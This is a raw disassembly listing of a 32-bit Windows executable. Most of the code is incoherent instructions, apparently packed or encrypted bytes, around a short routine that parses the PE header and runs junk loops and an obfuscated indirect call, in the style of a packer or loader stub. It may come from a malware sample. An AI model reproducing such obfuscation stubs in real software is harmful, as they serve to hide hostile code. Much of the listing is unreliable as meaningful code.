  4114c5:	enter  0xfc85,0x34
  4114c9:	xchg   edi,eax
  4114ca:	fwait
  4114cb:	adc    bl,BYTE PTR [eax-0x57]
  4114ce:	add    DWORD PTR ds:0x14574ffe,edi
  4114d4:	cmp    BYTE PTR [esi+esi*4+0x23],dh
  4114d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114d9:	dec    edx
  4114da:	dec    eax
  4114db:	push   ss
  4114dc:	mov    edi,0x1261d8e0
  4114e1:	cwde   
  4114e2:	mov    al,ds:0xee14834
  4114e7:	lock sahf 
  4114e9:	xchg   esi,eax
  4114ea:	retf   0x123c
  4114ed:	mov    ecx,0xc219373f
  4114f2:	(bad)  
  4114f3:	sar    BYTE PTR ds:0xa6788d06,cl
  4114f9:	sar    DWORD PTR cs:0xd1564d86,1
  411500:	cmc    
  411501:	fwait
  411502:	inc    edi
  411503:	mov    esp,0xcfcd74e6
  411508:	mov    eax,0xcc6bd89f
  41150d:	pop    ss
  41150e:	mov    al,ds:0x7d357a1d
  411513:	sub    eax,0x894f68ca
  411518:	inc    esp
  411519:	fistp  DWORD PTR [ebx+0x5]
  41151c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41151d:	dec    edx
  41151e:	(bad)  
  41151f:	iret   
  411520:	test   bl,bh
  411522:	jns    0x4114b4
  411524:	mov    fs,WORD PTR [ebx-0x4f295388]
  41152a:	mov    esp,0x13127519
  41152f:	xchg   BYTE PTR ds:[ebx],al
  411532:	rol    BYTE PTR [ebp+0x62d2d415],1
  411538:	mov    bh,BYTE PTR [edx]
  41153a:	stc    
  41153b:	icebp  
  41153c:	jbe    0x411569
  41153e:	cmp    BYTE PTR [ebp+0x557f8caf],dl
  411544:	add    BYTE PTR [ecx-0x466c2595],al
  41154a:	les    ebx,FWORD PTR [ebp+0x13]
  41154d:	into   
  41154e:	xchg   BYTE PTR [edi-0x6b],dl
  411551:	mov    bh,cl
  411553:	ds leave 
  411555:	adc    eax,0xed780ad9
  41155a:	repnz push esi
  41155c:	lods   al,BYTE PTR ds:[esi]
  41155d:	bound  esi,QWORD PTR [eax-0x14]
  411560:	push   edx
  411561:	lea    esp,[eax-0x32a30555]
  411567:	repnz push esi
  411569:	mov    ebp,DWORD PTR [ebx+0x182f496d]
  41156f:	jl     0x41158e
  411571:	jmp    FWORD PTR [ecx-0x6c]
  411574:	or     ecx,DWORD PTR ds:0x427468d
  41157a:	lods   al,BYTE PTR ds:[esi]
  41157b:	sti    
  41157c:	fild   DWORD PTR [ecx+edi*1-0x63946d51]
  411583:	mov    ebx,0xbf78e3ba
  411588:	shl    DWORD PTR [esi-0x7d],1
  41158b:	xchg   ecx,eax
  41158c:	outs   dx,BYTE PTR ds:[esi]
  41158d:	test   eax,0x655ab26
  411592:	add    BYTE PTR [edi],ch
  411594:	push   es
  411595:	hlt    
  411596:	sti    
  411597:	xchg   edx,eax
  411598:	mov    gs,WORD PTR [esp+edx*1]
  41159b:	cld    
  41159c:	cmp    al,0xf4
  41159e:	in     al,dx
  41159f:	mov    bl,BYTE PTR [eax+0x68]
  4115a2:	jge    0x411611
  4115a4:	mov    al,ds:0xa4bafce2
  4115a9:	sub    eax,0x4edac1c1
  4115ae:	ficomp DWORD PTR [edx+eax*2]
  4115b1:	xor    al,0xee
  4115b3:	in     eax,dx
  4115b4:	and    ebx,edx
  4115b6:	sub    BYTE PTR [ecx-0x67],al
  4115b9:	out    dx,eax
  4115ba:	sti    
  4115bb:	cwde   
  4115bc:	add    DWORD PTR [eax-0x77],ecx
  4115bf:	nop
  4115c0:	retf   
  4115c1:	imul   eax,DWORD PTR [esi+eiz*4-0x5bbca1d6],0xefe67a02
  4115cc:	add    al,0xc2
  4115ce:	bound  esp,QWORD PTR es:[eax-0x746bd9d4]
  4115d5:	push   ebp
  4115d6:	or     BYTE PTR [ebx],dh
  4115d8:	ror    DWORD PTR [ebp+0x729b1084],0x32
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	arpl   WORD PTR [ecx+0x408676b9],ax
  41161e:	jle    0x41169e
  411620:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411621:	jg     0x4116a1
  411623:	jle    0x4115c7
  411625:	push   ebx
  411626:	cdq    
  411627:	sub    al,BYTE PTR [eax+0x3a]
  41162a:	stos   DWORD PTR es:[edi],eax
  41162b:	mov    ds:0x6f66eaf0,eax
  411630:	popf   
  411631:	iret   
  411632:	mov    eax,0x660a4038
  411637:	mov    dl,0x8f
  411639:	sbb    ch,BYTE PTR [eax+ebp*2-0x3]
  41163d:	arpl   WORD PTR [eax-0x55],sp
  411640:	je     0x411687
  411642:	cmp    al,0xf1
  411644:	fwait
  411645:	push   es
  411646:	pop    eax
  411647:	mov    esp,0xde93ec5d
  41164c:	or     BYTE PTR [edx],al
  41164e:	push   eax
  41164f:	clc    
  411650:	stos   DWORD PTR es:[edi],eax
  411651:	stc    
  411652:	adc    eax,0xa58ecdbf
  411657:	test   eax,0x3f503c9
  41165c:	sbb    al,0x2d
  41165e:	lds    edi,FWORD PTR [ebp-0x1c8fc1fc]
  411664:	dec    ebx
  411665:	adc    edx,edi
  411667:	mov    ds:0xab01f98,al
  41166c:	and    bl,al
  41166e:	push   cs
  41166f:	(bad)  
  411670:	arpl   si,ax
  411672:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411673:	add    al,0x38
  411675:	(bad)  
  411677:	retf   0x8851
  41167a:	test   ebp,0xcde9e39c
  411680:	inc    esi
  411681:	imul   edi,DWORD PTR [ecx+0x16],0xf4282508
  411688:	adc    DWORD PTR [edi-0x41],ecx
  41168b:	dec    ecx
  41168c:	pop    edi
  41168d:	or     al,0x6f
  41168f:	cdq    
  411690:	jo     0x411655
  411692:	in     al,0x3
  411694:	sbb    edi,DWORD PTR [eax-0x1a20f80d]
  41169a:	mov    esp,0x48e679a1
  41169f:	xchg   ch,bh
  4116a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116a2:	xchg   edi,eax
  4116a3:	popa   
  4116a4:	mov    ebp,0xf1436fe7
  4116a9:	(bad)  [esi+eiz*4-0x2233286c]
  4116b0:	lea    esp,[ebp-0x50]
  4116b3:	mov    ebx,0x47fe6f73
  4116b8:	push   ebx
  4116b9:	dec    ecx
  4116ba:	sbb    eax,0xad5ace0f
  4116bf:	ret    
  4116c0:	push   ss
  4116c1:	or     al,0x4a
  4116c3:	pop    ebp
  4116c4:	cmp    BYTE PTR [edx-0x4e],ch
  4116c7:	aam    0x66
  4116c9:	lea    esi,[eax-0x3e]
  4116cc:	leave  
  4116cd:	mov    esp,0xe2d50bc5
  4116d2:	loopne 0x411672
  4116d4:	inc    esi
  4116d5:	push   edi
  4116d6:	stos   DWORD PTR es:[edi],eax
  4116d7:	and    cl,ch
  4116d9:	xor    eax,DWORD PTR [ebp+ebx*2+0x23]
  4116dd:	out    dx,eax
  4116de:	retf   
  4116df:	adc    ecx,DWORD PTR [esi]
  4116e1:	aam    0xe2
  4116e3:	mov    ah,cl
  4116e5:	add    eax,0xd820f775
  4116ea:	or     DWORD PTR [esi-0x13],0x46
  4116ee:	fmul   QWORD PTR [ecx-0x1a]
  4116f1:	test   eax,0x32b213ec
  4116f6:	sbb    al,0x80
  4116f8:	mov    edi,0x3cc6bf72
  4116fd:	mov    DWORD PTR [ebx-0x6dad787a],ebp
  411703:	int3   
  411704:	sub    al,ch
  411706:	pop    ss
  411707:	test   BYTE PTR [ebp+edi*1+0x5c58cfd0],al
  41170e:	add    BYTE PTR [ebp-0x38],ah
  411711:	pop    ss
  411712:	inc    eax
  411713:	(bad)  
  411714:	mov    ds:0x2c9204d4,al
  411719:	adc    BYTE PTR [ebx],bh
  41171b:	jle    0x411729
  41171d:	popa   
  41171e:	dec    esp
  41171f:	sub    eax,DWORD PTR [edx+ecx*4-0x80]
  411723:	adc    esi,DWORD PTR [esi-0x104244ae]
  411729:	jno    0x41178a
  41172b:	cmc    
  41172c:	stos   BYTE PTR es:[edi],al
  41172d:	lods   eax,DWORD PTR ds:[esi]
  41172e:	xchg   ebp,eax
  41172f:	(bad)  [ebp+0x10]
  411732:	jb     0x411746
  411734:	xchg   edi,eax
  411735:	cld    
  411736:	push   ecx
  411737:	lods   eax,DWORD PTR ds:[esi]
  411738:	sub    esp,DWORD PTR [edi]
  41173a:	cmp    al,0xe
  41173c:	mov    al,0x8
  41173e:	ins    DWORD PTR es:[edi],dx
  41173f:	call   DWORD PTR [ebx-0x26]
  411742:	out    dx,eax
  411743:	sbb    cl,dl
  411745:	jg     0x4116ef
  411747:	add    BYTE PTR [ecx-0xea3f059],0x4e
  41174e:	mov    al,ss:0xaa3d4c4
  411754:	and    esp,DWORD PTR [ebp+eiz*4+0x1f94c913]
  41175b:	ja     0x4116f4
  41175d:	test   DWORD PTR ss:[esi-0x37],edx
  411761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411762:	mov    esp,0x6f051db4
  411767:	fimul  WORD PTR [ecx-0x5c]
  41176a:	sti    
  41176b:	xor    BYTE PTR [eax+0x76d3f088],al
  411771:	outs   dx,BYTE PTR ds:[si]
  411773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411774:	lods   al,BYTE PTR ds:[esi]
  411775:	cli    
  411776:	mov    eax,ds:0x310bd2b0
  41177b:	les    edx,FWORD PTR [ebx+ebx*2-0x7c]
  41177f:	or     BYTE PTR [esi],ch
  411781:	test   BYTE PTR [ebx],ah
  411783:	arpl   bp,bx
  411785:	and    bh,ch
  411787:	clc    
  411788:	inc    esp
  411789:	inc    ebx
  41178a:	xchg   BYTE PTR [esi],dh
  41178c:	test   BYTE PTR [ecx+0xb5b63f4],dh
  411792:	sahf   
  411793:	sahf   
  411794:	daa    
  411795:	loope  0x4117ec
  411797:	adc    eax,0x65b5cc1d
  41179c:	adc    eax,0x5fdd6629
  4117a1:	scas   al,BYTE PTR es:[edi]
  4117a2:	fwait
  4117a3:	mov    ds:0xa6b42d75,al
  4117a8:	in     al,0x53
  4117aa:	lea    ecx,[edx+ecx*8]
  4117ad:	mov    ds:0x7cc09e4e,al
  4117b2:	sbb    ah,ah
  4117b4:	imul   esp,DWORD PTR ds:0x49f9dc53,0xffffffef
  4117bb:	imul   edx
  4117bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117be:	mov    DWORD PTR [edi-0x336ffe0f],ecx
  4117c4:	mov    ebx,esi
  4117c6:	shl    dl,1
  4117c8:	retf   0xd20d
  4117cb:	das    
  4117cc:	mov    ebx,0x8458bbf
  4117d1:	mov    DWORD PTR ds:0x433823,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x43377f,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	ds js  0x41193d
  4118ea:	jecxz  0x411918
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41195c
  4118f4:	mov    ebp,0xa8e1a8a
  4118f9:	xor    eax,DWORD PTR ds:0x6a90b090
  4118ff:	jno    0x41192d
  411901:	pop    esi
  411902:	add    bh,BYTE PTR [edx+esi*2+0x34]
  411906:	mov    ebp,0x487fd97f
  41190b:	in     eax,0x37
  41190d:	in     al,dx
  41190e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41190f:	jbe    0x41190b
  411911:	ins    BYTE PTR es:[edi],dx
  411912:	retf   
  411913:	xchg   edx,eax
  411914:	(bad)  
  411915:	inc    BYTE PTR [ebp+0x34d5235a]
  41191b:	mov    eax,ds:0xd7f7f26
  411920:	std    
  411921:	mov    eax,0x1152894c
  411926:	and    BYTE PTR [ecx+ebx*2+0x3a],0x2c
  41192b:	xchg   esp,eax
  41192c:	sbb    ecx,0xe81d431b
  411932:	or     edx,ebp
  411934:	fcomip st,st(4)
  411936:	jbe    0x4118da
  411938:	jecxz  0x41196c
  41193a:	push   esp
  41193b:	in     eax,0xdc
  41193d:	mov    ch,0x91
  41193f:	fdivr  st,st(0)
  411941:	fsub   DWORD PTR [ebx+0x1a]
  411944:	xor    eax,0xedf803a6
  411949:	and    bh,dl
  41194b:	or     edx,DWORD PTR [edx+0x44caab68]
  411951:	imul   DWORD PTR [edi+0x70]
  411954:	pop    DWORD PTR [eax-0x5d]
  411957:	shl    dh,1
  411959:	lea    ecx,[esi+0x3f]
  41195c:	scas   eax,DWORD PTR es:[edi]
  41195d:	or     eax,0x879c8909
  411962:	xchg   ebx,eax
  411963:	test   eax,0xe0fe8def
  411968:	out    0x0,al
  41196a:	sbb    eax,0x31ac1430
  41196f:	dec    esi
  411970:	lahf   
  411971:	imul   ebp,DWORD PTR [esi],0x3a87ad53
  411977:	inc    ebp
  411978:	push   DWORD PTR [edi]
  41197a:	cmp    edi,DWORD PTR [eax]
  41197c:	inc    ebp
  41197d:	cmp    DWORD PTR [esi],esp
  41197f:	push   ebx
  411980:	cmp    BYTE PTR [esi],bh
  411982:	and    BYTE PTR [esi-0x69214791],bl
  411988:	and    ecx,DWORD PTR [esi]
  41198a:	inc    ebp
  41198b:	pop    es
  41198c:	mov    ecx,0x9c84455f
  411991:	ins    DWORD PTR es:[edi],dx
  411992:	int3   
  411993:	test   al,0x6f
  411995:	sbb    bl,dl
  411997:	mov    ecx,0x7fe706ce
  41199c:	jmp    0xb7b95db3
  4119a1:	inc    edx
  4119a2:	mov    ch,0x4c
  4119a4:	lock imul ecx,DWORD PTR [eax-0x28],0x618d22aa
  4119ac:	ja     0x411a2c
  4119ae:	ret    0xe714
  4119b1:	jecxz  0x4119f9
  4119b3:	mov    cl,0xcd
  4119b5:	scas   eax,DWORD PTR es:[edi]
  4119b6:	jno    0x411a26
  4119b8:	sbb    dl,bl
  4119ba:	repnz les ebp,FWORD PTR [ebx]
  4119bd:	cmc    
  4119be:	jnp    0x4119b4
  4119c0:	dec    ecx
  4119c1:	fnsave [eax+0x1685405a]
  4119c7:	stos   BYTE PTR es:[edi],al
  4119c8:	shr    DWORD PTR [edi+ebx*4+0x7fc12f3d],cl
  4119cf:	sbb    ah,dl
  4119d1:	repz or BYTE PTR [edx],dh
  4119d4:	imul   ebx,DWORD PTR [edi+0x18],0x7f1661b
  4119db:	inc    esp
  4119dc:	adc    al,0xfa
  4119de:	popf   
  4119df:	or     ebx,DWORD PTR [edi-0x65]
  4119e2:	ret    
  4119e3:	inc    edx
  4119e4:	shr    DWORD PTR [edi+0x1cb135d2],1
  4119ea:	add    bh,cl
  4119ec:	out    dx,al
  4119ed:	xchg   ebp,eax
  4119ee:	test   al,0x29
  4119f0:	icebp  
  4119f1:	(bad)  
  4119f3:	xchg   BYTE PTR [esi-0x6e],ch
  4119f6:	jne    0x4119ed
  4119f8:	lds    eax,FWORD PTR [edx+0x14]
  4119fb:	xlat   BYTE PTR ds:[ebx]
  4119fc:	sub    BYTE PTR [eax+0x6d],bh
  4119ff:	and    eax,0xfa5137ca
  411a04:	push   esi
  411a06:	jne    0x411a15
  411a08:	sub    ebx,DWORD PTR [edi-0x7272b7af]
  411a0e:	loopne 0x4119da
  411a10:	pmulhw mm7,QWORD PTR [edx+0x52e88645]
  411a17:	add    eax,0x67d82c44
  411a1c:	mov    eax,0x4981065
  411a21:	xor    dh,BYTE PTR [eax+0x457554a4]
  411a27:	retf   0xd707
  411a2a:	stc    
  411a2b:	inc    ecx
  411a2c:	out    0x83,eax
  411a2e:	movnti DWORD PTR [esi+0x6],ebx
  411a32:	xchg   DWORD PTR [ebp-0x25546160],ecx
  411a38:	rol    dl,cl
  411a3a:	and    BYTE PTR ds:0xfc91b823,bl
  411a40:	pop    ebp
  411a41:	xchg   edx,eax
  411a42:	aad    0x10
  411a44:	pop    eax
  411a45:	sbb    ah,0x5d
  411a48:	sahf   
  411a49:	cmp    DWORD PTR [ebp+0xb55f3e6],ecx
  411a4f:	and    BYTE PTR [ebx],0xf6
  411a52:	or     eax,0x27e9d790
  411a57:	push   ecx
  411a58:	push   edi
  411a59:	jnp    0x411a0b
  411a5b:	popa   
  411a5c:	das    
  411a5d:	outs   dx,DWORD PTR ss:[esi]
  411a5f:	pop    ebp
  411a60:	cli    
  411a61:	inc    ecx
  411a62:	xchg   BYTE PTR [ebp-0x49],cl
  411a65:	mov    dl,0x6
  411a67:	lea    eax,[ebx-0x6a85d5f2]
  411a6d:	add    BYTE PTR [eax+0x29c54ff9],bl
  411a73:	cmp    edi,esi
  411a75:	popa   
  411a76:	out    0x4d,eax
  411a78:	stos   DWORD PTR es:[edi],eax
  411a79:	mov    ds,WORD PTR ds:0x15affb14
  411a7f:	jp     0x411ae7
  411a81:	push   ebp
  411a82:	icebp  
  411a83:	(bad)  
  411a84:	sahf   
  411a85:	and    DWORD PTR [edx+0x77],edx
  411a88:	sbb    BYTE PTR [ecx],0x63
  411a8b:	add    eax,0xbaca6532
  411a90:	les    ebp,FWORD PTR [edi]
  411a92:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  411a94:	lahf   
  411a95:	xor    DWORD PTR [edi],edx
  411a97:	fldenv [eax+0x27eead47]
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
